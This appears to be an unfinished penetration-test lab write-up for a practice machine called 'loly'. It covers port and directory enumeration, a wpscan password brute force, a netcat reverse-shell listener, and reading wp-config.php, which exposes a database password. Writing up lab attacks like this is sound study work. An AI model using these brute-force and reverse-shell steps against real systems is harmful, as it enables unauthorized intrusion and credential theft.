- **Independent Challenges**
- **1 Target #1 – 192.168.133.165**
- **1.1 Initial Access –**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**Steps to reproduce the attack:**

- **1.1 Service Enumeration**

**Host Discovery**

└─# nmap -sn --min-rate=20000 192.168.133.160-170

![[loly image.png]]

**Service Enumeration**

└─# nmap -p- --min-rate=20000 192.168.133.165

![[loly image 1.png]]

**Port Scan Results**

| **IP Address** | **Ports Open** |
| --- | --- |
| 192.168.133.165 | **TCP**: 80 |

└─# nmap -p80 -sC -sV -A --min-rate=20000 192.168.133.165

![[loly image 2.png]]

OS Ubuntu Linux

Port 80

nginx 1.10.3

whatweb result

![[loly image 3.png]]

Directory Enumeration.

└─# ffuf -c -u http://192.168.133.165/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

![[loly image 4.png]]

![[loly image 5.png]]

**wordpress**

└─# feroxbuster -u http://192.168.133.165 -w /usr/share/dirb/wordlists/common.txt -g

![[loly image 6.png]]

**Discovery Subdomain.**

└─# ffuf -c -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://FUZZ.192.168.133.165/ -fc 404

└─# nikto -h http://192.168.133.165

![[loly image 7.png]]

**readme.txt**

![[loly image 8.png]]

![[loly image 9.png]]

**1.2** **Initial Access –**

└─# wpscan --url http://loly.lc/wordpress/ -U loly -P /usr/share/wordlists/rockyou.txt

![[loly image 10.png]]

![[loly image 11.png]]

![[loly image 12.png]]

└─# rlwrap nc -nlvp 4444

![[loly image 13.png]]

$ python3 -c 'import pty; pty.spawn("/bin/bash")'

www-data@ubuntu:/$ cd /var/www/html/wordpress

cd /var/www/html/wordpress

www-data@ubuntu:~/html/wordpress$ ls

ls

index.php        wp-blog-header.php    wp-includes        wp-settings.php

license.txt      wp-comments-post.php  wp-links-opml.php  wp-signup.php

readme.html      wp-config.php         wp-load.php        wp-trackback.php

wp-activate.php  wp-content            wp-login.php       xmlrpc.php

wp-admin         wp-cron.php           wp-mail.php

www-data@ubuntu:~/html/wordpress$ cat wp-config.php

cat wp-config.php

\<?php

/**

\* The base configuration for WordPress

-

\* The wp-config.php creation script uses this file during the

\* installation. You don't have to use the web site, you can

\* copy this file to "wp-config.php" and fill in the values.

-

\* This file contains the following configurations:

-

\* * MySQL settings

\* * Secret keys

\* * Database table prefix

\* * ABSPATH

-

\* @link https://wordpress.org/support/article/editing-wp-config-php/

-

\* @package WordPress

*/

// ** MySQL settings - You can get this info from your web host ** //

/** The name of the database for WordPress */

define( 'DB_NAME', 'wordpress' );

/** MySQL database username */

define( 'DB_USER', 'wordpress' );

/** MySQL database password */

define( 'DB_PASSWORD', 'lolyisabeautifulgirl' );

/** MySQL hostname */

define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */

define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */

define( 'DB_COLLATE', '' );

/**#@+

\* Authentication Unique Keys and Salts.

-

\* Change these to different unique phrases!

\* You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}

\* You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.

-

\* @since 2.6.0

*/

define( 'AUTH_KEY',         'put your unique phrase here' );

define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );

define( 'LOGGED_IN_KEY',    'put your unique phrase here' );

define( 'NONCE_KEY',        'put your unique phrase here' );

define( 'AUTH_SALT',        'put your unique phrase here' );

define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );

define( 'LOGGED_IN_SALT',   'put your unique phrase here' );

define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**

\* WordPress Database Table prefix.

-

\* You can have multiple installations in one database if you give each

\* a unique prefix. Only numbers, letters, and underscores please!

*/

$table_prefix = 'wp_';

/**

\* For developers: WordPress debugging mode.

-

\* Change this to true to enable the display of notices during development.

\* It is strongly recommended that plugin and theme developers use WP_DEBUG

\* in their development environments.

-

\* For information on other constants that can be used for debugging,

\* visit the documentation.

-

\* @link https://wordpress.org/support/article/debugging-in-wordpress/

*/

define( 'WP_DEBUG', false );

define( 'DISALLOW_FILE_EDIT', true );

define( 'DISALLOW_FILE_MODS', true );

define('FS_METHOD','direct');

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */

if ( ! defined( 'ABSPATH' ) ) {

define( 'ABSPATH', __DIR__ . '/' );

}

/** Sets up WordPress vars and included files. */

require_once ABSPATH . 'wp-settings.php';

![[loly image 14.png]]

**1.3** **Privilege Escalation -**

loly@ubuntu:~$ uname -ar

uname -ar

![[loly image 15.png]]

![[loly image 16.png]]

**1.4** **Post Exploitation**

![[loly image 17.png]]

**Proof.txt value:**

![[loly image 18.png]]